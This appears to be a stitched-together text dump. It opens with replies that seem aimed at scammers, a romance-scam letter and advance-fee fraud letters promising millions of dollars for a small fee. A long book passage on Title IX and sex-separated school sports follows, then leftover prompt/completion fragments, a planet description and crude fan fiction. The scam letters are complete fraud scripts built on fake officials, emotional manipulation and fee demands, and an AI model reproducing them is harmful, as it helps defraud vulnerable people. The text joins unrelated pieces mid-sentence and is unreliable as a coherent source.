I'd like to thank you for your clear explanation of the processes involved and the assistance you are offering in sorting out the necessary paperwork. It's quite reassuring to know that the bureau is there to facilitate this transaction without requiring any fees—I cannot overstate how comforting that is. As requested, I will provide my mobile number for ease of communication. Due to the sensitive nature of such transactions, however, I am in the process of setting up a secure line of communication. The new number will be specifically used for dealings such as this one, ensuring the privacy and security of our correspondence. I shall forward this to you once it is operational. When it comes to the identification and postal address, I am currently ensuring that all documents are up-to-date and meet the requirements to proceed with this claim. I will compile the necessary items and as soon as they're ready, I will inquire about the best way to securely transmit them to you.

Your forthrightness about avoiding any shortcuts or fraudulent schemes is duly noted, and I will maintain vigilance as we progress.

Hi Cameron, my beloved tiger. I yearn for your correspondence. When I don't receive your new emails, I revisit the old ones and read them once again. I am genuinely interested in getting to know you better. I am very happy to write to you on this fine Tuesday. I am very pleased that you like my photos. Yesterday, we still had an air alarm at lunch. And I had to go to the bomb shelter, but at least it did not last very long, about 1 hour. During this time, about 15 drones were shot down next to the city, and only a few fragments fell within the city. As far as I know, people were not injured. I really hope that I will see what you look like in the next letter. Please respond to me as soon as you can find the opportunity. I apologize if there are times when I'm unable to reply promptly. Currently, I am going through a stressful period. Balancing studies, work, and preparing for my upcoming journey to your country demands a lot of time. However, despite all this, I manage to find moments to read your letters and compose a response. I hope you won't be offended by any delays, my dear Cameron. It would have been wonderful to talk on the phone and hear your voice. Unfortunately, I recently lost my personal phone while traveling on the bus. Purchasing a new phone in our country is quite expensive. I anticipate being able to buy a new phone during my internship as the prices in your country are comparatively lower than in Ukraine. Regrettably, I cannot provide you with a phone number at the moment. Therefore, email correspondence remains the easiest way for us to communicate, and I hope you understand. As I mentioned before, my trip preparations have kept me extremely occupied, leaving no time to deal with phone-related issues. As of now, I do not have the exact date of my departure for training, it's still uncertain. However, I have assured the University Rector that this matter will be resolved soon. Once I have all the details about my trip, I will promptly inform you. What matters most to me is that we will soon have the opportunity to meet, and I will be able to explain everything while looking into your beautiful eyes. I eagerly await the day when we can finally meet in person. Wouldn't that be amazing, Cameron? Unfortunately, I must bring this letter to a close. I want to close my eyes and dream of you. I yearn to see you in my dreams and fulfill all our desires that currently exist only in our thoughts. By the way, tomorrow I will be attending the birthday celebration of my friend Oksana. Honestly, I'm not particularly excited about going there. Due to the prevailing state of martial law, everything will be quite different compared to usual. I anticipate feeling bored since you won't be by my side. Many girls will be accompanied by their partners, some even with children. I am exhausted from being alone and long for a man who will love me. I feel incredibly fortunate that we have met and can develop our relationship. However, I couldn't decline my friend's invitation as she is very dear to me. I must attend her birthday party. All the pictures taken at the event will feature Oksana, and I want to express my immense gratitude to her. I wish to share a secret about our friendship with you. When we first started university, Oksana and I were involved romantically. We were young and desired affection and tenderness. However, our relationship didn't last long, merely around one month. We realized that we are not attracted to each other as women. We concluded that no girl could provide the same level of affection and love as a man. Oksana and I remained good friends. Unfortunately, at Oksana's request, I cannot send you her pictures. She prefers to keep herself distanced from our relationship. But I can assure you that she is a beautiful girl, and most importantly, she is a true friend who supports me through any difficult situation. Perhaps I shouldn't have shared this story with you, as it might displease Oksana. However, as I mentioned earlier, I desire complete honesty between us without any secrets. This story with Oksana was our secret, and let it remain that way. If it troubles you in any way, I implore you not to disclose it to anyone. Let this story stay solely between us. Do you agree, my dear Cameron? I have bared my heart and soul to you, and I hope you will reciprocate by answering me. I eagerly await your next email. I genuinely hope that my letter hasn't made you sad or bored. If by chance you are feeling down, I ask for your forgiveness for sending my pictures. Can you forgive me? Whenever you feel lonely or sad, gaze upon my pictures, and everything will change. I want to bring a smile to your face. Please don't forget about me. A million kisses for you. With the best regards!

Your safety during such incidents is of utmost importance to me, and I am relieved to hear that you were unharmed. Regarding your request for a photograph, I must apologize for the delay in sharing my visage with you. Truth be told, I have been meaning to capture the essence of my appearance in a picture that I feel would do justice to the unique bond we are forging with each word we share. I am working on finding that perfect moment and the ideal photograph to send to you. Please be patient with me, as I want it to be special. I understand the rigors of balancing studies, work, and preparing for such a significant journey as yours. The stress is undoubtedly immense, but your determination shines through your writing. Your focus and dedication to preparation are admirable, and I am certain it will yield a successful trip. Your unfortunate loss of the phone on the bus must have been quite distressing. It's astounding how vital these little devices have become in our daily lives and how disoriented we can feel when they are lost. I am looking forward to the day when we can converse with ease, and perhaps once you've arrived and settled in, acquiring a phone will be a trivial matter. Your upcoming meeting with me fills my thoughts with anticipation. The idea of conversing in person, sharing stories and dreams, is a delightful prospect. It’s a day I too await with eagerness. As for the story of you and Oksana, your transparency is not only appreciated but also reciprocated. Sharing such personal history shows a level of trust that I will respect and honor. I assure you, your secret is safe with me, and you needn't fear any judgment from my side. We all have chapters in our lives that shape us into who we are, and I am gratified that you chose to share yours with me. Marfa, as you attend Oksana's birthday party, please take care to enjoy yourself, even though you may feel an undercurrent of longing for companionship. Celebrate your friendship and the unique bond you share, as it is these connections that sustain us through life's trials. When you close your eyes and dream, know that I too will be envisioning a world where our paths have crossed, and our shared desires have transformed into reality. Until we can share a photograph, a call, or a personal encounter, take solace in our blossoming conversation. With every kiss you blow across the world and towards me, I reciprocate with thoughts of warmth and affection. Stay safe and strong, and do not worry about delayed responses. I understand completely, and there will always be a space for your words in my inbox, whenever they may arrive.

Lastly, could you furnish me with some form of verification or identification number that is tied to this parcel for traceability and future inquiries? I'm a firm believer in the adage 'better safe than sorry' and as such, insist on ensuring all transactions and correspondences I undertake are above board. The small fee of US150.00 seems reasonable for such a service, but due diligence is a habit I take quite seriously. Upon receipt of this more detailed information, I'll promptly see to the transfer of the required fee through a fast money transfer agent, as per your recommendation. I await the receiver's information and any additional relevant details to securely conduct this transaction.

The Federal Reserve Bank came up to make a wire transfer but they said you couldn't meet the fee demand for the transfer, so they gave up on you. In a more proper and legalized manner, the International Monetary Fund and the Federal Reserve Bank solicited the Fund Reconciliation Department to allow your fund to be written as a Check or Credited as a Visa Card and be shipped to your home address through the USA Priority Express Mail. These options, we supposed, could be the best, easiest and the most efficient way to have you get hold of your long awaited United Nations approved funds. However, as a former white House Chief Of Staff under the Obama Administration, I wish to state categorically that a CERTIFICATE CHECK of 25.000,000 USD drawn on the Federal Reserve will be issued and sent to you via the US postal Service to you. Every and all cost associated with the delivery of your CHECK has been prepaid by the US-Government. The only cost associated with your fund release is the cost of processing a fund Clearance Certificate by our attorney with the US Monetary Policy and it is the only expense you will incur before your fund will be credited into an ATM CARD or CHECK will be Sent to your mailing address.

Greetings Beloved Friend, I saw your email from Search Engine and i decided to contact you urgently for this great opportunity between me and you, permit me to introduce myself to you, My name is Major Garry Williams. I am an American soldier, presently in Syria for training, working with allies and also helping in stabilising the country against security challenges. With a very desperate need for assistance, I have decided to contact you for your kind assistance to move the sum of (US48,000,000.00) Forty Eight Million United States Dollars to you if I can be assured that my share will be safe in your care until I complete my service. Some money in various currencies was discovered in boxes at a farmhouse during a rescue operation we conducted in one of the attacks by the terrorists and it was agreed by my colleagues and I that some part of this money be shared among us. The above figure was given to me as my share, and to conceal this kind of money became a problem for me, so with the help of a British doctor working with Red Cross, I was able to get the package out to a safe location entirely out of trouble spot. he does not know the real content of the package, and believes that it belongs to a American medical doctor who died in a raid here in Syria, and before giving up, trusted me to hand over the package to his Family. I have now found a much secure way of getting the package out of Syria to you for pick up and I will discuss this with you when I am sure that you are willing to assist me. I am ready to compensate you with 35% of the 48 million USD for your assistance. I do not know how long we will remain here, and I have been shot, wounded and survived two suicide bomb attacks by the special grace of God, this and other reasons I will mention later has prompted me to reach out for help.

This indeed sounds like a significant sum of money, and the circumstances through which it came to you are quite extraordinary. Knowing the funds are from a conflict zone, I am mindful of the legal and ethical considerations that such a transaction would involve. Your offer to share a substantial portion of this money with me in exchange for handling it is generous, and the opportunity to assist a servicemember in such a difficult situation is not something I would take lightly. However, I'm sure you can understand that such a situation requires substantial trust and verification on both ends. Before we proceed any further, there are some details that I would need clarification on to ensure that we are both protected and proceeding within the bounds of the law: 1. Could you provide more specifics regarding the logistics of moving the funds out of Syria? Clearly, it would need to be done cautiously and within the framework of international regulations. 2. What arrangements have been made with the British doctor, and how will the package be kept secure until it reaches me? 3. Once the funds are in my care, what are the steps you foresee to ensure that they are not only kept safe but also eventually returned to you upon the completion of your service? 4. Could we discuss the legal implications of transferring such funds? It is essential to have a clear view of any potential legal review or obligations that may arise.

If she guesses wrong and misses the play, this is used to validate the “switch” in the first place. A similar confidence-draining strategy Wachs observed involved instructions that directed women to hold back, anticipating incompetence, in high-stakes moments. For example, female batters were encouraged to take “walks” at important points in the game when a male batter was up next. Even when well intentioned, such practices hinder the empowering and confidence-building potential of sport for women. Other research has also questioned whether coed sports are a site of empowerment and skills building for girls and women, even prior to the onset of physical differences that might make boys better athletes on average.41 In their study of kindergarteners playing coed T-ball, Melissa Landers and Gary Fine found that, instead of challenging gender role socialization and nurturing girls’ athletic skills, coed T-ball reinforced gender hierarchies and discouraged girls from later participation in sports.42 Both male and female coaches were more likely to demean and criticize the girls’ abilities, and they provided boys with greater instruction and encouragement. The study concluded that, rather than correcting gender inequities in coed participation, coaches and teachers often reinforced it. As a result, girls were less likely to find the game fun and were more likely to lose interest in sports.43 The case for separation also emphasizes the value of all-female spaces for creating bonds between girls and women and developing a stronger sense of identity. This is particularly valuable for young adolescents who are struggling to sort through conflicting and multilayered messages about femininity and female bodies. Instead of worrying about how boys perceive them, girls can focus on their bodies as a source of strength and functionality. All-female sports can also teach healthy interfemale competition and cooperation. Competing with and against other women in sports challenges the dominant cultural lens that tries to turn competition among women into “catfights” and has trouble understanding female competition as anything other than fighting over a boyfriend or superficial jealousy over who is more attractive or popular. By providing a setting where women play together, work together, and compete together, all-female sports can teach healthy models of competition and cooperation. Such experiences can help dispel pervasive gender stereotypes that encourage distrust of women leaders and portray female bosses as mean, petty, and difficult to work for. In terms of influencing the legal framework, the case for sex separation in sports has had much greater impact than the arguments against it. Nevertheless, there are significant downsides to the “separate but equal” model, and arguments for gender integration are not easily dismissed. The Critique of Separation: Reinforcing Sex Difference and Gender Hierarchy As a strategy for promoting gender equality in sports, Title IX’s baseline of sex separation is not without costs. Separating women from men in athletic competition sends the message that men are better athletes. After all, the judicial rationale for preserving sex separation in sports, evident in the O’Connor case, assumes that gender-blind selection would leave female athletes with fewer opportunities because they cannot hold their own against male athletes. This message is troubling and has led some supporters of gender equality to question whether sex separation should be abandoned in favor of an integrationist model. Karen Tokarz, a law professor, for example, has argued that sex segregation in sports “fosters the myth of male supremacy” and “perpetuates the sex role stereotype of women as passive and weak.”44 Another legal scholar, B. Glenn George, is also critical of sex-separate teams, arguing that separate is not equal in this context and pointing to the greater expenditures, resources, and attention devoted to men’s intercollegiate sports.45 Mary Jo Kane, a sports sociologist, has raised the related concern that separating male and female athletes makes gender a more salient and prominent category that shapes our thinking about sports. With teams divided by gender, male and female athletes are channeled into “gender-appropriate” sports, and athletes who conform to the gender continuum receive the most positive cultural attention. Female athletes in figure skating and gymnastics, for example, garner more spectator interest than the women who play rugby. Likewise, football players typically garner more status and attention than male swimmers and volleyball players. The gender division of sports thus “works to suppress evidence of a [gender] continuum,” making sex difference seem more natural, inevitable, and significant than it is.46 Speaking of sex segregation in education more generally, the feminist legal scholar Nancy Levit makes a similar point when she observes that the impact of single-sex environments on the cultural construction of gender is too often ignored in debates over sex segregation in education, and warns that separation may exalt and exaggerate perceived gender differences.47 Proponents of gender integration in sports emphasize the importance of challenging the gender ideology that views the presence of women in male sports as threatening to the gender order. Much of the resistance to gender integration in sports reflects deep-seated attachment to what sport sociologists describe as the masculinizing function of sports. When girls and women seek to join male teams, they undermine the ability of sports to teach a traditional masculinity that defines manhood by its distance from, and superiority over, femininity. The determination not to “throw like a girl” loses its force when confronted by a girl who throws well. Some early court decisions rebuffing claims by female athletes who sought to try out for male sports teams reflect this troubling gender ideology. For example, a pre–Title IX Connecticut decision rejected a high school girl’s attempt to try out for boys’ track and cross country.48 The judge reasoned that, although “[a]thletic competition builds character in boys,” “[w]e do not need that kind of character in our girls.”49 He continued, tellingly, to proclaim that the male population is “not so decadent” as to get a thrill out of beating girls.50 The judge’s apprehensiveness about boys engaging in sports with girls reflects anxiety about a loss in status and about the ability of sports to confer that status if male athletes have to compete with girls. Beating a girl would dilute the masculinity that comes from successful athletic competition. And, of greater significance, the judge’s reaction reflects an anxiety over the unspoken question of what happens to a boy’s masculinity if he loses to a girl.51 Some of the fiercest battles to keep girls out of male sports have been fought over baseball. As the historian Sarah Fields points out, it is no accident that most of the lawsuits brought by girls seeking to compete on boys’ teams have involved baseball, a sport highly infused with national identity and masculinity.52 Organized baseball has a long and unfortunate history of fighting to keep girls and women from playing the sport.53 In one early example, the University of Pennsylvania acted quickly to bar women from playing baseball when five women spontaneously joined men in an on-campus baseball game in 1904.54 Women were also excluded from professional baseball. When a seventeen-year-old young woman, Jackie Mitchell, signed a minor league contract in 1931, she struck out baseball legends Babe Ruth and Lou Gehrig in an exhibition game. The commissioner quickly responded by voiding Mitchell’s contract and issuing new rules that barred women from the sport on the grounds that it was too strenuous for women.55 The sport was no more welcoming to younger female players. Little League began in 1939 as a summer program to teach boys masculinity and Americanism. The federal charter giving Little Legal nonprofit status, signed by President Lyndon Johnson, specifically stated its purpose as assisting “boys in developing qualities of citizenship, sportsmanship, and manhood.”56 By the 1970s, girls and their parents were questioning girls’ exclusion from Little League, and some families brought lawsuits to challenge it.The first such case, decided in 1973, was not successful. Ten-year-old Pamela Magill brought an equal protection challenge to the decision of the Avonworth Baseball Conference, in western Pennsylvania, not to permit her to play Little League baseball.57 The directors of the league countered that if girls were allowed to play, it would “destroy” the league because boys would not want to play against girls and would drop out of the sport. The court sided with the defendant on the ground that the conference was not a state actor and therefore was not subject to the Constitution’s equal protection clause. Adding insult to injury, the court went on to opine unfavorably on the merits of Magill’s claim, reasoning that sex differences and the nature of baseball as a contact sport made it “rational” to exclude girls from the game.58 As sex-discrimination law began to take shape in the early to mid-1970s, however, the tide was beginning to turn.59 In 1974, one year after the Magill case, a New Jersey appellate court interpreted New Jersey’s law barring discrimination in places of public accommodation to require Little League chapters in the state to allow girls on the team. The court was not persuaded by Little League’s arguments for excluding eight- to twelve-year-old girls, which were based on protectionist rationales about girls as weaker athletes, and ordered the league to admit girls.60 Little League Baseball considered appealing to the New Jersey Supreme Court, and many teams in the state decided to suspend play rather than to allow girls; however, the controversy was soon settled at a higher level of government.61 The cases caught the attention of Congress, and Congress acted to amend the Little League charter in 1974 to broaden the beneficiaries of the sport to “young people,” in place of the previously stated purpose of assisting boys in developing manhood. As a result, Little League changed its rules in 1974 to allow girls to participate in Little League baseball, while at the same time creating Little League Softball for girls—a move clearly designed to channel girls into a more feminized version of the sport. As of 2003, 360,000 girls participated in Little League Softball, and 100,000 girls participated in Little League Baseball.62 In schools today, baseball is still a sport typically played by boys, with girls playing softball. By too readily accepting sex separation in sports, critics argue, Title IX misses an opportunity to challenge the gender ideology behind the exclusion of women from men’s games. Critics of sex separation in sport also warn of its tendency to produce different rules for male and female sports. The contrast between baseball and softball is just one example of how sex separation leads to different sport rules based on the sex of the participants. Sports for girls and women have often been modified to make them less physically demanding, such as the allowance for “checking” in lacrosse and ice hockey when played by boys but not by girls. Basketball, too, for most of its history has been played by girls under very different rules. For many years, girls’ teams had six players instead of five, and teams played on a divided court to make the game less strenuous.63 Legal challenges to rule differences in girls’ sports have been mostly unsuccessful. For example, Victoria Ann Cape, a high school basketball player, was rebuffed in her Title IX and constitutional challenges to Tennessee Secondary School Athletic Association rules limiting women to half-court basketball, mandating six players on the court, and restricting players in certain positions from shooting the ball.64 The court of appeals reasoned that the same gender differences in athleticism that support separating competition by sex in the first place also justify the development of different rules of the game for men and women. Such reasoning, however, does not inevitably follow from the justification for sex-separate teams. One federal district court in Arkansas ruled that the state athletic association’s rules limiting girls to halfcourt basketball violated the equal protection clause, even though the court assumed that it was constitutional to have separate teams for boys and girls.65 This court recognized the disadvantage the half-court rules caused Arkansas girls in competing for college scholarships and the lack of a sufficient justification for preventing girls from fully experiencing the game. Most courts, however, have used the gender-difference rationale behind sex separation to justify different rules for conducting male and female sports.66 Athletic associations gradually brought the rules of girls’ basketball in line with the boys’ game voluntarily. Girls’ basketball has not been played sixon-six in a state-sanctioned game since Oklahoma abolished the practice in 1995.67 Nevertheless, many male and female sports continue to have different rules. Some rule differences correspond to average physical differences, such as the practice of having a lower net for women’s volleyball than for men’s volleyball. Others, however, change the game more fundamentally, such as the checking/no-checking difference in men’s and women’s ice hockey.68 In theory, rules for girls’ and women’s sports might develop differently in order to better design sports to fit their interests, skills, and bodies. As a male-dominated institution, sport has been tailored to men’s bodies and interests and has been designed to showcase men’s talents and abilities. However, a less charitable explanation may be traced back to the ideology of preserving the construction of masculinity through male sports participation. In this ideology, it diminishes the boys’ game if girls play the game in the same manner as the boys.69Another piece of the gender ideology behind keeping women off men’s teams is the fear that women’s participation will introduce an element of sexuality into sport and the desire to preserve a carefully guarded heterosexual image in men’s sports. This concern is often behind the resistance to coed wrestling. It is often expressed in terms of boys being hamstrung in their moves in an effort to avoid what might be construed as sexual contact. Opponents raise the specter that coed wrestling introduces an element of sexuality that they do not believe is present when males wrestle other males. This concern reflects an anxiety about sexuality in sports that involve close bodily contact between men. Implicit and pervasive heterocentric norms hide the intimacy of the moves when it’s “just the guys” competing, but the involvement of women in the sport heightens awareness of the intimacy of the moves involved in the sport. As Sarah Fields explains the negative reaction to girls seeking to integrate wrestling teams, “People who had never given much critical thought to scantily clad young men rolling around together on a mat suddenly had a means of deflecting concerns of male sexuality and homoeroticism.”70 This kind of “sex panic” often occurs when women seek to integrate male-dominant settings where physicality is prominent. Women’s integration into the military, for example, has often been resisted on the grounds that the presence of women in close physical quarters introduces a problematic sexuality that is otherwise presumed to be absent. The concern about sexuality often sits alongside an even deeper anxiety about men losing to women in tests of physical power. These combined concerns have led some boys (supported by their parents) to forfeit wrestling matches against girls in coed competitions, leaving the girls with fewer competitive opportunities and the message that they are not proper competitors.71 Proponents of gender integration in sport emphasize the importance of resisting these gender ideologies that underlie prohibitions on female-male competition in sport. They see a missed opportunity for the potentially transformative power of gender-integrated teams to challenge existing gender relations and redefine them on a more equal basis. The case for coed sports competition and against Title IX’s baseline of sex segregation gained prominence recently in a book by Eileen McDonagh and Laura Pappano called Playing with the Boys: Why Separate Is Not Equal in Sports. 72 McDonagh and Pappano make the case against sex segregation in sports with great depth and eloquence. They argue that the gender division in sports rests on gender stereotypes and not actual physical differences and that it reinforces the view that women’s sports are a diluted version of “real” (male) sports. Their argument has its roots in liberal feminism, which regards persons as individuals to be judged on their own merits, not defined or limited by gender. They advocate a world of competitive sports in which athletes are selected for their abilities without regard to gender. They lambast Title IX’s acceptance of sex segregation as the norm for sports, thereby “codify[ing] historic myths about female physical inferiority and foster[ing] a system which, while offering women more opportunities than ever before, still keeps them from being perceived as equal athletes to men.”73 Under their proposal, separate women’s teams could still exist on a voluntary basis to compensate for discrimination, but coercive sex segregation in sports would be replaced with a gender-blind, best-athlete model. Their position allowing voluntary separate teams for women who choose not to compete with men would likely mean that the “open to all” teams would have top-tier status, with the most resources, publicity, and school support. In other words, implicit in what these authors propose is that firstorder sports, those played at the highest varsity level, would be open to all athletes, male and female, for tryouts, while separate women’s teams could continue on a voluntary basis, with a status more akin to club or intramural sports. In advocating the integration model, McDonagh and Pappano persuasively argue that sex segregation constructs and amplifies, rather than merely reflects, sex differences between male and female athletes. They point out that there is much more variance in physical ability within the sexes than there is between them and that average sex differences do not translate into female inferiority. Some physical differences give female athletes an advantage on average. For example, women’s higher percentage of body fat helps them in endurance events. They cite, as an example, study results in which equally trained male and female athletes performed identically in races over forty-two kilometers and women outperformed men at distances over ninety kilometers.74 To be sure, other average physical differences give an advantage to men on balance, but many individual women still perform equal to or better than many individual men. Moreover, average sex differences in athletic performance are declining.75 As more women have the training, opportunity, and encouragement to perform at their full capacity, average performance gaps may shrink further or even, over time, disappear altogether.76 McDonagh and Pappano argue that female athletes will never be equal to men as long as sex-separate participation is the norm. Their book has reinvigorated the debate over separation versus integration in sports and raises troubling questions about Title IX’s baseline of sex separation as a starting point for measuring equal opportunityWhich Side Is Right? It is the nature of a dilemma that there is no singular resolution that avoids the pitfalls of the path not taken without a significant downside of its own. The choice between gender assimilation and gender integration in sports presents precisely such a dilemma. The case against sex-segregated sports is overwhelmingly persuasive—until you consider the case against sex integration as the baseline. And vice versa. Exploring this dilemma raises interesting questions without clear answers. What is the significance of the message sent by gender separation? Is it that women are weaker and men are the “real” athletes? Or is it that women’s value as athletes does not depend on their ability to compete with men, that girls and women deserve support as athletes in their own right, and that all-female competition in sport is powerful, robust, and fun? More important, whatever the message sent by sex-separate competition, how does it compare to the reality of how the choice between assimilation and separation affects real opportunities for girls and women in sports? How should Title IX weigh the importance of ideology—which is complex and difficult to discern—against concrete opportunities? Although there are no easy answers to these questions, I do not believe that gender integration as the baseline would do a better job of subverting women’s second-class status in sports than the current default of separation. At the level of ideology, it is not at all clear that integration challenges rather than reinforces messages of women’s inferiority in sports. Both sides in the argument over separation and integration rely on and reinforce assumptions of male athletic superiority. For example, in the O’Connor case discussed earlier, the argument for separating boys and girls was that boys would dominate otherwise, leaving fewer opportunities for women to play sports. But the opposing argument also drew upon and reinforced an ideology of male athletic superiority. Karen O’Connor’s reason for wanting to play on the boys’ team was that boys play the game better and she needed the challenge to fully develop her skills. Rather than subverting traditional gender ideologies, a shift to genderneutral team selection buys into the notion that, to be “real” athletes, women must compete with men and that any athletic field that does not include men is not worthy of support. It takes as a given the reality that the sports offered in our schools have been selected for and governed by men to ensure their fit with men’s bodies, interests, and abilities. Instead of weakening gender hierarchy in sports and transforming gender relations, switching to a baseline of coed play would more likely wind up reinforcing an ideology of male athleticsuperiority, with the message that it is only the exceptional and unusual (not “real”) woman who can compete with the boys. Both sex separation and integration risk reinforcing the ideology of male dominance. More important, the debate over the cultural meaning of sex separation versus integration cannot be resolved in the abstract without attention to the effects on real opportunities for girls and women in sports. If gender-blind team selection would significantly reduce the numbers of girls and women playing varsity sports, either because they no longer wanted to play sports or because of average sex differences, the effect of gender integration, in terms of both gender ideology and real opportunities, would be much worse than that of sex separation. If female athleticism is viewed as exceptional and aberrational and male ascendancy as the natural result of merit-based selection, girls’ and women’s sports will lose their power to promote cultural change. As Paul Willis, a scholar of sport and society, explains, “Heroic sports success amongst a few women—without a massive, corresponding ideological battle to change the field of force of meaning—will not lead to greater participation regularly in schools and sports centres by girls and women, nor to a liberation in their sense of gender.”77 Two feminist authors and sport scholars, Leslie Heywood and Shari Dworkin, touch upon a similar theme when they discuss the cultural significance of the movie Girlfight, in which a female boxer struggles for recognition and success in the male preserve of boxing.78 She fights men, and at one level the movie promotes the feminist message that women can compete with men in the toughest of sports. However, the film highlights her differences from other women as much as it displays her “masculine” traits of strength and courage. Picking up on this subtext, Heywood and Dworkin reveal another layer of meaning that undercuts the film’s exterior feminist message. They ask, “Does her individual growth, then, help the status of the generic girls to whom she is contrasted, or does it merely serve to reinforce those conventions because she is presented as different?” Is her ascendance “available to all girls,” or does it bolster a form of male power while promoting the (false) ideology that it’s available to all?79 Their questions drive home the point that if girls’ and women’s success in sports is at or near token levels, the feminist gain from seeing elite women compete against men will be lost to the deeper message that female excellence in sport is aberrational. Given the conflicting ways to “read” the ideology of gender integration and separation in sports, it is better to go with the strategy that produces the greatest results in terms of the broad participation of girls and women in sports. It is through this broad participation that Title IX has had its greatest impact. As the sport sociologist David Whitson explains, in a reference to an influential feminist philosopher, “If [Iris Marion] Young is correct [about the empowering potential of women learning to use their bodies actively], the physical empowerment of more women and the entry into sport of greater numbers of women will steadily contribute toward breaking down the masculine connotations of sport itself.”80 Title IX’s effect on female sports participation has set exactly such a process into motion. Title IX’s biggest success, and its most revolutionary impact in terms of producing cultural transformation, is the huge increase in the number of girls who grow up playing organized sports, with many of them continuing to do so into adulthood. This, much more than the accomplishments of a few elite athletes, has had the greatest impact on changing the place of women in society. Although celebrity athletes also have an important influence on the culture and provide role models for other female athletes, it is the advent of girls and women participating in sport in mass numbers that has been truly revolutionary. As female athletic participation has grown, along with societal interest and excitement in women’s sports, it is no longer so clear that separate is necessarily second class for women. Gender ideology and the role of gender in shaping social life, including in sports, are constantly in flux. The past few decades have seen a remarkable upsurge of respect and appreciation for female athletes, with each new Olympics touting the extraordinary performance of women in the post–Title IX era. There is more appreciation of women in sports than ever before. Discourses about powerful women and “girl power” coexist and compete with more reactionary discourses that marginalize female athletes by highlighting their appearance or sexuality. In sports, as in other areas of social life, the cultural debate over gender continues, with competing views on what it means and how social policies should respond. Critics who would replace Title IX’s structure with gender integration do not fully grapple with the nature of the dilemma and what would be lost by retreating from Title IX’s substantive approach to getting women into sports. In their book criticizing “separate but equal” in sport, McDonagh and Pappano do a terrific job elaborating the costs of sex separation. But they do not explore the limits of gender integration. They are so steeped in the liberal feminist perspective that they do not acknowledge the pitfalls of such a strategy or the compelling critique of liberal feminism elsewhere in feminist theory. At one point, McDonagh and Pappano criticize sex segregation in sports as “not American” for disregarding the individual and instead placing emphasis on a person’s membership in a social group.81 A similar philosophy is at the heart of the backlash against affirmative action and the push for “color blindness” and its counterpart, “gender blindness,” in law and social policy. But in a system implicitly modeled on male norms and in which gender is a continuing source of inequality, a gender-blind approach often further entrenches inequality rather than eradicates it. In using Brown v. Board of Education as their liberal model of equality, the authors gloss over the problems with this paradigm. Once race is eliminated as a device for sorting students, de facto racial segregation is perfectly lawful. Resulting inequalities in educational outcomes are then attributed to innate ability and work ethic, obscuring the structural inequalities like residential segregation and systemic poverty that leave children of color with much poorer educational opportunities than more privileged white children. The analogy to Brown is far from perfect, and certainly there was much to gain from stopping a system of stateenforced racial segregation in schools. However, color blindness on its own, like gender blindness, is a limited theory of equality that fails to grapple with the deep structures of bias and treats resulting inequalities as the legitimate result of a fair process. Title IX has been more substantive and creative, taking a more progressive tact than liberal feminism, one that has been made possible by the law’s baseline allowance for sex separation in sports. In the final analysis, Title IX has chosen the right priority: expanding girls’ and women’s participation in sports through a substantive approach to measuring equality in athletic opportunities. Although the educational value of sports is often obscured by the commercialization of elite college sports, particularly in men’s football and basketball programs, sports are in our schools because of their educational, social, psychological, and physical benefits. These benefits, and the empowerment and fun that come with them, are every bit as valuable for girls as for boys. Moreover, as a feminist project, expanding female athletic participation has the potential to empower women and to broaden their access to power in society. A strategy focused on empowering a greater number of women through sport has more transformative potential than a strategy of gender-blind sports selection. As the legal scholar Robert Post has argued, the purpose of sex-discrimination law should not be to eliminate the social category of gender but to change its meaning.82 Still, even if the baseline of sex separation is the more promising feminist strategy, the downsides to separation are nevertheless real—hence, the dilemma cannot be fully and unequivocally resolved. In the final analysis, whether “separate but equal” works as a feminist strategy in sport depends on how it is mediated by integration rights and the circumstances under which athletes can cross the gender line. Under Title IX’s legal framework, sex separation is not absolute. There are important, albeit limited, rights to cross over to a team offered to the other sex. Chapter 2 examines integration rights as an important qualification to sex-separate opportunities and evaluates how such integration rights help mitigate, if not eliminate, the downsides of sex separation. Ideally, the law should work on both fronts: maximizing the real opportunities for girls and women in sports, while at the same time critically examining the gender ideology that limits sports opportunities by a student’s sex.","completion":"The text discusses the debate over gender integration versus gender separation in sports, particularly in the context of Title IX. It explores the arguments for and against each approach, highlighting the potential impact on female athletes and the cultural implications of each. The text acknowledges the complexities of the issue and the difficulty in finding a clear solution. It ultimately argues that while gender integration may have drawbacks, the current approach of sex separation under Title IX has been successful in increasing female participation in sports and challenging gender norms in athletics. The text suggests that a combination of both approaches, along with consideration of integration rights, may be the most effective way to address the dilemma."},{"prompt":"Describe land sea planet named Xyloci, it's ethereal and serene bluer world, it's poop-smelly.

Despite its appearance, the pollution is actually a natural occurrence on Xyloci, created by the organic processes of the planet's unique ecosystem. The land of Xyloci is covered in maroon-colored vegetation, which appears almost black due to the thick, polluted atmosphere. The plants are hardy and resilient, adapted to thrive in the harsh conditions of their environment. They provide a stark contrast to the blue skies and dark waters of Xyloci. The animals that inhabit Xyloci are equally unique and fascinating. They have adapted to the planet's harsh conditions, developing specialized features and behaviors to survive in this polluted world. Despite the challenging environment, the creatures of Xyloci are resilient and beautiful, adding to the planet's allure and mystique.

The smoldering ruins had long been replaced by a façune of normality, and our devil-may-care protagonist, Nero, had traded in his demonic decapitations for a day of domestic debauchery. With his stomach growling like a hellish hound, Nero knew it was time for a feast, but alas, the fridge was as empty as Dante's poetry book. \\"Guess it’s time for some fresh catch of the day,\\" Nero muttered to himself, cracking his knuckles - or rather, his bionic fingers - as he prepped for a most unconventional fishing trip. Disrobing with all the grace of a man entirely too confident in his solitude, Nero waded into the nearest pond. The moonlight danced upon his pale, albeit muscular, derrière, illuminating it like a ghastly beacon. The water met his skin with a surprising warmth, causing his cobalt blue hair to darken like the depths he sought to conquer. Beads of water clung to his finely chiseled physique, each muscle corded and tense with the electricity of the hunt. His rugged face wore a smirk, lips curled as though sharing a secret joke with the aquatic world before him. Nero slowly submerged himself, feeling the soft, muddy bottom squish between his toes. It wasn't long before Nero executed his flawless, albeit flatulent, fishing method. Taking a deep breath, the young Devil Hunter allowed his body to relax, a mischievous twinkle in his eye. With a decisive clench, he let loose an underwater blast, a fart of such profound potency it seemed to echo across the arc of devil-hunter lore. The pond rippled with the aftermath. Fish floated to the surface in a stunned stupor, their bulging eyes a testament to their unexpected demise. They, poor souls, had sniffed their last briny breath, poisoned by a pungent perfume the likes of which no sea or river had borne witness to before. Nero emerged, dripping with victory (and pond water), laughing heartily as he collected the fish, his bare buttocks glistening in the night, a sight that would make even a siren aver her gaze. \\"What can I say? I’ve got the deadliest ass in the demon world,\\" he boasted, striding toward his humble abode, an armful of fish his trophy. Back at home, the devilish chef donned an apron (and thankfully, some pants) to tackle the culinary crusade that awaited him. Slicing and dicing with the precision of a swordsman, Nero prepared a garlic herb marinade, scandalously sparing with the beans - for obvious 